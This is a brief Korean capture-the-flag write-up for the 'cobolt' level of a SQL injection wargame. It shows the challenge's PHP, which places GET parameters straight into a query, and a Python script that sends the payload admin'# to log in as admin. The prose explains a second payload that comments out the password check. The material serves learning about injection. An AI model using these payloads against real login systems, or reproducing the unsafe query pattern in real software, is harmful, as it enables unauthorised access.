## COBOLT Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");  
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");  
$query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id'] == 'admin') solve("cobolt");  
elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>";  
highlight_file(__FILE__);  
?>
```
### Exploit 코드
``` python
import requests

url = 'http://los.rubiya.kr/cobolt_b876ab5595253427d3bc34f1cd8f30db.php'
cookies = {'PHPSESSID' : 'My PHPSESSID'}
params = {}
params['id'] = "admin'#"

res = requests.get(url, cookies = cookies, params = params)

if "Clear" in res.text :
    print("[♪] COBOLT Clear!")
```
1번 문제는 id의 존재만 확인했지만 이번 문제는 id가 admin이어야 한다.  
따라서 id에 **'||id='admin'#** 을 넣어주었다.
``` php
select id from prob_cobolt where id=''||id='admin'#' and pw=''
```
쿼리문이 위와 같이 되고 id가 admin이 되어 문제가 풀린다.